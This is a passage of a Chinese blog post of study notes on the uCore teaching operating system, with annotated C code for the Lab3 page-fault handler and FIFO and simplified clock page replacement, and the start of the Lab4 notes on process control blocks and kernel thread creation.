class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">// 用于描述某个虚拟页的结构</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">vm_mm</span>;</span> <span class="hljs-comment">// 管理该虚拟页的mm_struct</span><br>    <span class="hljs-keyword">uintptr_t</span> vm_start;      <span class="hljs-comment">// 虚拟页起始地址，包括当前地址  </span><br>    <span class="hljs-keyword">uintptr_t</span> vm_end;        <span class="hljs-comment">// 虚拟页终止地址，不包括当前地址（地址前闭后开）  </span><br>    <span class="hljs-keyword">uint32_t</span> vm_flags;       <span class="hljs-comment">// 相关标志位</span><br>    <span class="hljs-keyword">list_entry_t</span> list_link;  <span class="hljs-comment">// 用于连接各个虚拟页的双向指针</span><br>&#125;;<br><br><span class="hljs-comment">// 数据结构Page相关成员的用途已在uCore-2中介绍过，这里只提它新增的两个成员pra_*</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> &#123;</span><br>    <span class="hljs-keyword">int</span> ref;<br>    <span class="hljs-keyword">uint32_t</span> flags;<br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> property;<br>    <span class="hljs-keyword">list_entry_t</span> page_link;<br>    <span class="hljs-keyword">list_entry_t</span> pra_page_link;     <span class="hljs-comment">// 用于连接上一个和下一个*可交换已分配*的物理页</span><br>    <span class="hljs-keyword">uintptr_t</span> pra_vaddr;            <span class="hljs-comment">// 用于保存该物理页所对应的虚拟地址。</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>当分配某个虚拟页<code>vma_struct</code>时，程序会在<code>insert_vma_struct</code>函数中设置其<code>vm_mm</code>成员为某个<code>mm_struct</code>，这样便于后续的管理。</li><li>在函数<code>pgdir_alloc_page</code>中，程序会设置<code>Page</code>的<code>pra_vaddr</code>成员，将其设置为当前物理页所对应的虚拟地址，之后便可通过<code>Page-&gt;pra_vaddr-&gt;pte</code>一条链，直接找到当前<strong>物理页</strong>地址所对应的PTE条目。同时，也可通过<code>pra_vaddr</code>来确定对应外存的相对偏移<code>page-&gt;pra_vaddr/PGSIZE+1</code>。</li><li><code>Page::page_link</code>用于将空闲物理页连接至双向链表中，而<code>page::pra_page_link</code>用于将<strong>可交换的已分配</strong>物理页连接至另一个双向链表中，注意两者的用途是不同的。</li></ul></li></ul><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2><h3 id="练习0"><a href="#练习0" class="headerlink" title="练习0"></a>练习0</h3><blockquote><p><strong>填写已有实验</strong> </p></blockquote><h3 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h3><blockquote><p><strong>给未被映射的地址映射上物理页</strong></p><p>完成do_pgfault（mm/vmm.c）函数，给未被映射的地址映射上物理页。设置访问权限 的时候需要参考页面所在 VMA 的权限，同时需要注意映射物理页时需要操作内存控制 结构所指定的页表，而不是内核的页表。</p></blockquote><p>实验代码如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_pgfault</span><span class="hljs-params">(struct mm_struct *mm, <span class="hljs-keyword">uint32_t</span> error_code, <span class="hljs-keyword">uintptr_t</span> addr)</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> ret = -E_INVAL;<br>    <span class="hljs-comment">// 获取触发pgfault的虚拟地址所在虚拟页</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vma_struct</span> *<span class="hljs-title">vma</span> =</span> find_vma(mm, addr);<br><br>    pgfault_num++;<br>    <span class="hljs-comment">// 如果当前访问的虚拟地址不在已经分配的虚拟页中</span><br>    <span class="hljs-keyword">if</span> (vma == <span class="hljs-literal">NULL</span> || vma-&gt;vm_start &gt; addr) &#123;<br>        cprintf(<span class="hljs-string">&quot;not valid addr %x, and  can not find it in vma\n&quot;</span>, addr);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// 检测错误代码。这里的检测不涉及特权判断。</span><br>    <span class="hljs-keyword">switch</span> (error_code &amp; <span class="hljs-number">3</span>) &#123;<br>    <span class="hljs-keyword">default</span>:<br>        <span class="hljs-comment">// 写，同时存在物理页，则写时复制</span><br>        <span class="hljs-comment">// 需要注意的是，default会执行case2的代码，也就是判断是否有写权限。</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>        <span class="hljs-comment">// 同时如果当前操作是写入，但所在虚拟页不允许写入</span><br>        <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_WRITE)) &#123;<br>            cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = write AND not present, but the addr&#x27;s vma cannot write\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-comment">/* error code flag : (W/R=0, P=1): read, present */</span><br>        <span class="hljs-comment">// 读，同时存在物理页。那就不可能会调用page fault，肯定哪里有问题，直接failed</span><br>        cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = read AND present\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-comment">/* error code flag : (W/R=0, P=0): read, not present */</span><br>        <span class="hljs-comment">// 如果当前操作是读取，但所在虚拟页不允许读取或执行</span><br>        <span class="hljs-keyword">if</span> (!(vma-&gt;vm_flags &amp; (VM_READ | VM_EXEC))) &#123;<br>            cprintf(<span class="hljs-string">&quot;do_pgfault failed: error code flag = read AND not present, but the addr&#x27;s vma cannot read or exec\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// 设置页表条目所对应的权限</span><br>    <span class="hljs-keyword">uint32_t</span> perm = PTE_U;<br>    <span class="hljs-keyword">if</span> (vma-&gt;vm_flags &amp; VM_WRITE) &#123;<br>        perm |= PTE_W;<br>    &#125;<br>    addr = ROUNDDOWN(addr, PGSIZE);<br>    ret = -E_NO_MEM;<br>    <span class="hljs-keyword">pte_t</span> *ptep=<span class="hljs-literal">NULL</span>;<br><br>    <span class="hljs-comment">/* LAB3 EXERCISE 1: YOUR CODE */</span><br>    <span class="hljs-comment">// 查找当前虚拟地址所对应的页表项</span><br>    <span class="hljs-keyword">if</span> ((ptep = get_pte(mm-&gt;pgdir, addr, <span class="hljs-number">1</span>)) == <span class="hljs-literal">NULL</span>) &#123;<br>        cprintf(<span class="hljs-string">&quot;get_pte in do_pgfault failed\n&quot;</span>);<br>        <span class="hljs-keyword">goto</span> failed;<br>    &#125;<br>    <span class="hljs-comment">// 如果这个页表项所对应的物理页不存在，则</span><br>    <span class="hljs-keyword">if</span> (*ptep == <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 分配一块物理页，并设置页表项</span><br>        <span class="hljs-keyword">if</span> (pgdir_alloc_page(mm-&gt;pgdir, addr, perm) == <span class="hljs-literal">NULL</span>) &#123;<br>            cprintf(<span class="hljs-string">&quot;pgdir_alloc_page in do_pgfault failed\n&quot;</span>);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* LAB3 EXERCISE 2: YOUR CODE */</span><br>        <span class="hljs-comment">// 如果这个页表项所对应的物理页存在，但不在内存中</span><br>        <span class="hljs-comment">// 如果swap已经初始化完成</span><br>        <span class="hljs-keyword">if</span>(swap_init_ok) &#123;<br>            struct Page *page=<span class="hljs-literal">NULL</span>;<br>            <span class="hljs-comment">// 将目标数据加载到某块新的物理页中。</span><br>            <span class="hljs-comment">// 该物理页可能是尚未分配的物理页，也可能是从别的已分配物理页中取的</span><br>            <span class="hljs-keyword">if</span> ((ret = swap_in(mm, addr, &amp;page)) != <span class="hljs-number">0</span>) &#123;<br>                cprintf(<span class="hljs-string">&quot;swap_in in do_pgfault failed\n&quot;</span>);<br>                <span class="hljs-keyword">goto</span> failed;<br>            &#125;<br>            <span class="hljs-comment">// 将该物理页与对应的虚拟地址关联，同时设置页表。</span><br>            page_insert(mm-&gt;pgdir, page, addr, perm);<br>            <span class="hljs-comment">// 当前缺失的页已经加载回内存中，所以设置当前页为可swap。</span><br>            swap_map_swappable(mm, addr, page, <span class="hljs-number">1</span>);<br>            page-&gt;pra_vaddr = addr;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            cprintf(<span class="hljs-string">&quot;no swap_init_ok but ptep is %x, failed\n&quot;</span>,*ptep);<br>            <span class="hljs-keyword">goto</span> failed;<br>        &#125;<br>   &#125;<br>   ret = <span class="hljs-number">0</span>;<br>failed:<br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li>关于<code>get_pte() and page_remove_pte() vs. page_inseret()</code>回顾: <ul><li>get pte and return the kernel virtual address of this pte for la if the PT contianing this pte didn’t exist, alloc a page for PT</li><li>page的插入和删除意味着page结构的ref增减以及pte的存在与否, 而实验为了弄出一个练习, 在<code>page_remove()</code>中判断pte不为空后调用<code>page_remove_pte()</code>, ref_dec and clear pte.</li></ul></li></ul><hr><ul><li>请描述页目录项（Page Directory Entry）和页表项（Page Table Entry）中组成部分对ucore实现页替换算法的潜在用处。<ul><li>即PTE结构与其标志位用途</li></ul></li><li>如果ucore的缺页服务例程在执行过程中访问内存，出现了页访问异常，请问硬件要做哪些事情？<ul><li>将发生错误的线性地址（虚拟地址）保存至CR2寄存器中。</li><li>压入<code>EFLAGS</code>，<code>CS</code>, <code>EIP</code>，错误码和中断号至当前内核栈中。</li><li>保存上下文。</li><li>执行新的缺页中断程序。</li><li>恢复上下文。</li><li>继续执行<strong>上一级</strong>的缺页服务例程。</li></ul></li></ul><h3 id="练习2"><a href="#练习2" class="headerlink" title="练习2"></a>练习2</h3><blockquote><p><strong>补充完成基于FIFO的页面替换算法</strong></p><p>完成vmm.c中的do_pgfault函数，并且在实现FIFO算法的swap_fifo.c中完成map_swappable和swap_out_victim函数。</p></blockquote><ul><li><p><code>FIFO</code>中，当新加入一个物理页时，我们只需将该物理页加入至链表首部即可。当需要换出某个物理页时，选择链表末尾的物理页即可。</p></li><li><p>相关实现如下</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_fifo_map_swappable(struct mm_struct *mm, <span class="hljs-keyword">uintptr_t</span> addr, struct Page   *page, <span class="hljs-keyword">int</span> swap_in)<br>&#123;<br>    <span class="hljs-keyword">list_entry_t</span> *head=(<span class="hljs-keyword">list_entry_t</span>*) mm-&gt;sm_priv;<br>    <span class="hljs-keyword">list_entry_t</span> *entry=&amp;(page-&gt;pra_page_link);<br><br>    assert(entry != <span class="hljs-literal">NULL</span> &amp;&amp; head != <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-comment">//record the page access situlation</span><br>    <span class="hljs-comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span><br>    <span class="hljs-comment">//(1)link the most recent arrival page at the back of the pra_list_head qeueue.</span><br>    list_add(head, entry);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_fifo_swap_out_victim(struct mm_struct *mm, struct Page ** ptr_page, <span class="hljs-keyword">int</span> in_tick)<br>&#123;<br>     <span class="hljs-keyword">list_entry_t</span> *head=(<span class="hljs-keyword">list_entry_t</span>*) mm-&gt;sm_priv;<br>         assert(head != <span class="hljs-literal">NULL</span>);<br>     assert(in_tick==<span class="hljs-number">0</span>);<br>     <span class="hljs-comment">/* Select the victim */</span><br>     <span class="hljs-comment">/*LAB3 EXERCISE 2: YOUR CODE*/</span><br>     <span class="hljs-comment">//(1)  unlink the  earliest arrival page in front of pra_list_head qeueue</span><br>     <span class="hljs-comment">//(2)  assign the value of *ptr_page to the addr of this page</span><br>     <span class="hljs-keyword">list_entry_t</span> *le = head-&gt;prev;<br>     assert(head!=le);<br>     <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">p</span> =</span> le2page(le, pra_page_link);<br>     list_del(le);<br>     assert(p !=<span class="hljs-literal">NULL</span>);<br>     *ptr_page = p;<br><br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure></li><li><p>如果要在ucore上实现”extended clock页替换算法”请给你的设计方案，现有的swap_manager框架是否足以支持在ucore中实现此算法？如果是，请给你的设计方案。如果不是，请给出你的新的扩展和基此扩展的设计方案。并需要回答如下问题</p><ul><li>现有的swap_manager框架可以支持在ucore中实现此算法，具体见<strong>扩展练习1</strong>。</li><li>需要被换出的页的特征是什么？<ul><li><code>PTE_P</code>(Present)和<code>PTE_D</code>(Dirty)位均为0。</li></ul></li><li>在ucore中如何判断具有这样特征的页？<ul><li>获取线性地址所对应的页表项，之后使用位运算判断<code>PTE_P</code>和<code>PTE_D</code>。</li></ul></li><li>何时进行换入和换出操作？<ul><li>缺页时换入。</li><li>物理页帧满时换出，不过需要注意dirty bit的处理。可以在修改dirty的时候写入外存，或者可以在最终要删除该物理页时再写入外存。后者有利于多个写操作的合并，降低缺页代价，但此时的页替换算法却退化成普通的clock算法，而不是extended clock算法了。</li></ul></li></ul></li></ul><h3 id="challenge1"><a href="#challenge1" class="headerlink" title="challenge1"></a>challenge1</h3><ul><li><p>需要注意的是extended clock算法会修改dirty bit, 但是swap.c中的swap_out()函数直接把<code>_fifo_swap_out_victim()</code>通过参数返回的page写入到磁盘swap分区中, <strong>根本不管有没有修改过</strong>, 或许可以改进</p></li><li><p>改进的时钟算法会修改dirty bit的原因可能是让被修改过的页面停留在内存中的时间更长, 因为要经过更多次的遍历才能被置换出</p></li><li><p>我寻思把PTE_D and PTE_A结合起来遍历到了就减一也没啥特别的, 而且下一次进入错误处理例程指针还是按照上次的接着继续(如果严格按照PPT上的话), 按别人的做法还要遍历三次当前swappable的页面, 遍历一次记录第一次遇到的00,10,11不就成了, 减少一点微不足道的写回时间(好像没有</p></li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span><br>_extend_clock_swap_out_victim(struct mm_struct *mm, struct Page **ptr_page, <span class="hljs-keyword">int</span> in_tick)<br>&#123;<br>    <span class="hljs-keyword">list_entry_t</span> *head = (<span class="hljs-keyword">list_entry_t</span> *)mm-&gt;sm_priv;<br>    assert(head != <span class="hljs-literal">NULL</span>);<br>    assert(in_tick == <span class="hljs-number">0</span>);<br>    <span class="hljs-comment">//在head双向链表中从头开始遍历, 两个数字代表PTE_A PTE_D组成两位的样子</span><br>    <span class="hljs-comment">//用三个指针取第一次遍历到的page, 00优先级最高</span><br>    <span class="hljs-keyword">list_entry_t</span> *le = head-&gt;next, *_00 = <span class="hljs-literal">NULL</span>, *_10 = <span class="hljs-literal">NULL</span>, *_11 = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-keyword">while</span> (le != head)<br>    &#123;<span class="hljs-comment">//只需遍历一次</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Page</span> *<span class="hljs-title">page</span> =</span> le2page(le, pra_page_link); <span class="hljs-comment">//字面意思</span><br><br>        <span class="hljs-keyword">pte_t</span> *ptep = get_pte(mm-&gt;pgdir, page-&gt;pra_vaddr, <span class="hljs-number">0</span>);<br>        assert(ptep != <span class="hljs-literal">NULL</span>);<span class="hljs-comment">//写着意思一下, 也不知有啥用</span><br>        <span class="hljs-keyword">if</span> (!(*ptep &amp; PTE_A))<br>        &#123;<span class="hljs-comment">//遇到第一个00就可以直接break了, 受害者就是你!</span><br>            _00 = le;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<span class="hljs-comment">//剩下两种情况不能break(为了不写的更复杂</span><br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!(*ptep &amp; PTE_D) &amp;&amp; _10 == <span class="hljs-literal">NULL</span>)<br>            _10 = le;<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (_11 == <span class="hljs-literal">NULL</span>)<br>            _11 = le;<br>        le = le-&gt;next;<br>    &#125;<br>    le = _00 != <span class="hljs-literal">NULL</span> ? _00 : (_10 != <span class="hljs-literal">NULL</span> ? _10 : _11);<span class="hljs-comment">//根据优先级选一个不为零的</span><br>    *ptr_page = le2page(le, pra_page_link);<span class="hljs-comment">//把受害者的page赋值给这东西</span><br>    list_del(le);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>成了, 简化了一下没有什么用的改进时钟算法, 只要一次甚至不用完全的一次遍历即可做到相同效果, 还通过了fifo的检查, 有这么巧吗</p><blockquote><p>想了一下, 我这快简化成FIFO了, 而改进的时钟置换算法的优势在于<strong>相近的</strong>多次遍历之中, 被写过的页面可以在内存中驻留更久的时间</p><p>坑不填了, 问题就是这个意思没有很复杂</p></blockquote><h3 id="challenge2"><a href="#challenge2" class="headerlink" title="challenge2"></a>challenge2</h3><p>暂时不写</p><h1 id="Lab4"><a href="#Lab4" class="headerlink" title="Lab4"></a>Lab4</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><h3 id="0-项目组成-1"><a href="#0-项目组成-1" class="headerlink" title="0.项目组成"></a>0.项目组成</h3><p>相对与实验三，实验四中主要改动如下：</p><ul><li>kern/process/ （新增进程管理相关文件）<ul><li>proc.[ch]：新增：实现进程、线程相关功能，包括：创建进程/线程，初始化进程/线程，处理进程/线程退出等功能</li><li>entry.S：新增：内核线程入口函数kernel_thread_entry的实现</li><li>switch.S：新增：上下文切换，利用堆栈保存、恢复进程上下文</li></ul></li><li>kern/init/<ul><li>init.c：修改：完成进程系统初始化，并在内核初始化后切入idle进程</li></ul></li><li>kern/mm/ （基本上与本次实验没有太直接的联系，了解kmalloc和kfree如何使用即可）<ul><li>kmalloc.[ch]：新增：定义和实现了新的kmalloc/kfree函数。具体实现是基于slab分配的简化算法 （只要求会调用这两个函数即可）</li><li>memlayout.h：增加slab物理内存分配相关的定义与宏 （可不用理会）。</li><li>pmm.[ch]：修改：在pmm.c中添加了调用kmalloc_init函数,取消了老的kmalloc/kfree的实现；在pmm.h中取消了老的kmalloc/kfree的定义</li><li>swap.c：修改：取消了用于check的Line 185的执行</li><li>vmm.c：修改：调用新的kmalloc/kfree</li></ul></li><li>kern/trap/<ul><li>trapentry.S：增加了汇编写的函数forkrets，用于do_fork调用的返回处理。</li></ul></li><li>kern/schedule/<ul><li>sched.[ch]：新增：实现FIFO策略的进程调度</li></ul></li><li>kern/libs<ul><li>rb_tree.[ch]：新增：实现红黑树，被slab分配的简化算法使用（可不用理会）</li></ul></li></ul><h3 id="1-重要数据结构-link"><a href="#1-重要数据结构-link" class="headerlink" title="1.重要数据结构[link]"></a>1.重要数据结构<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab4/lab4_3_2_pcb.html">[link]</a></h3><blockquote><p>这次的<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab4/lab4_3_1_lab_steps.html">实验指导书</a>真绝, 写的是没法比那个好了, 就写点自己领悟到的流程吧</p></blockquote><p>为了管理系统中所有的进程控制块，uCore维护了如下全局变量（位于<em>kern/process/proc.c</em>）：</p><ul><li><code>static struct proc *current</code>：当前占用CPU且处于“运行”状态进程控制块指针。通常这个变量是只读的，只有在进程切换的时候才进行修改，并且整个切换和修改过程需要保证操作的原子性，目前至少需要屏蔽中断。可以参考 switch_to 的实现。</li><li><code>static struct proc *initproc</code>：本实验中，指向一个内核线程。本实验以后，此指针将指向第一个用户态进程。</li><li><code>static list_entry_t hash_list[HASH_LIST_SIZE]</code>：所有进程控制块的哈希表，proc_struct中的成员变量hash_link将基于pid链接入这个哈希表中。</li><li><code>list_entry_t proc_list</code>：所有进程控制块的双向线性列表，proc_struct中的成员变量list_link将链接入这个链表中。</li></ul><p>PCB好像有所简化:</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> &#123;</span><br>    PROC_UNINIT = <span class="hljs-number">0</span>,  <span class="hljs-comment">// 未初始化的     -- alloc_proc</span><br>    PROC_SLEEPING,    <span class="hljs-comment">// 等待状态       -- try_free_pages, do_wait, do_sleep</span><br>    PROC_RUNNABLE,    <span class="hljs-comment">// 就绪/运行状态   -- proc_init, wakeup_proc,</span><br>    PROC_ZOMBIE,      <span class="hljs-comment">// 僵死状态       -- do_exit</span><br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> &#123;</span>  <span class="hljs-comment">// 保存的上下文寄存器，注意没有eax寄存器和段寄存器</span><br>    <span class="hljs-keyword">uint32_t</span> eip;<br>    <span class="hljs-keyword">uint32_t</span> esp;<br>    <span class="hljs-keyword">uint32_t</span> ebx;<br>    <span class="hljs-keyword">uint32_t</span> ecx;<br>    <span class="hljs-keyword">uint32_t</span> edx;<br>    <span class="hljs-keyword">uint32_t</span> esi;<br>    <span class="hljs-keyword">uint32_t</span> edi;<br>    <span class="hljs-keyword">uint32_t</span> ebp;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">proc_state</span> <span class="hljs-title">state</span>;</span>          <span class="hljs-comment">// 当前进程的状态</span><br>    <span class="hljs-keyword">int</span> pid;                        <span class="hljs-comment">// 进程ID</span><br>    <span class="hljs-keyword">int</span> runs;                       <span class="hljs-comment">// 当前进程被调度的次数</span><br>    <span class="hljs-keyword">uintptr_t</span> kstack;               <span class="hljs-comment">// 内核栈</span><br>    <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">bool</span> need_resched;     <span class="hljs-comment">// 是否需要被调度</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">proc_struct</span> *<span class="hljs-title">parent</span>;</span>     <span class="hljs-comment">// 父进程ID</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mm_struct</span> *<span class="hljs-title">mm</span>;</span>           <span class="hljs-comment">// 当前进程所管理的虚拟内存页，包括其所属的页目录项PDT</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">context</span> <span class="hljs-title">context</span>;</span>         <span class="hljs-comment">// 保存的上下文</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">trapframe</span> *<span class="hljs-title">tf</span>;</span>           <span class="hljs-comment">// 中断所保存的上下文</span><br>    <span class="hljs-keyword">uintptr_t</span> cr3;                  <span class="hljs-comment">// 页目录表的地址</span><br>    <span class="hljs-keyword">uint32_t</span> flags;                 <span class="hljs-comment">// 当前进程的相关标志</span><br>    <span class="hljs-keyword">char</span> name[PROC_NAME_LEN + <span class="hljs-number">1</span>];   <span class="hljs-comment">// 进程名称（可执行文件名）</span><br>    <span class="hljs-keyword">list_entry_t</span> list_link;         <span class="hljs-comment">// 用于连接list</span><br>    <span class="hljs-keyword">list_entry_t</span> hash_link;         <span class="hljs-comment">// 用于连接hash list</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="2-流程"><a href="#2-流程" class="headerlink" title="2.流程"></a>2.流程</h3><ul><li>首先肯定是<code>proc_init()</code>:</li></ul><p><img src="../../image/ucore/image-20211224212029857.png" alt="image-20211224212029857"></p><ul><li><p>首先初始化一下<code>proc_list</code>和<code>hash_list</code>, 然后调用<code>alloc_proc()</code>来通过<code>kmalloc()</code>获取一个proc_struct的空间, 以及略微初始化一下第0个内核线程idleproc(指把状态设成PROC_UNINIT, pid设成-1等等)</p></li><li><p>接着真正初始化一下各个字段的值, 其中kstack直接设置成内核栈bootstack(前面给过出处, 内核栈总共8KB), 弄成current</p></li><li><p>接着调用kern_thread来创建第1个内核线程</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">kernel_thread(<span class="hljs-keyword">int</span> (*fn)(<span class="hljs-keyword">void</span> *), <span class="hljs-keyword">void</span> *arg, <span class="hljs-keyword">uint32_t</span> clone_flags)<br>&#123;<span class="hljs-comment">//三个参数为init_main, &quot;Hello World!&quot;, 0</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> 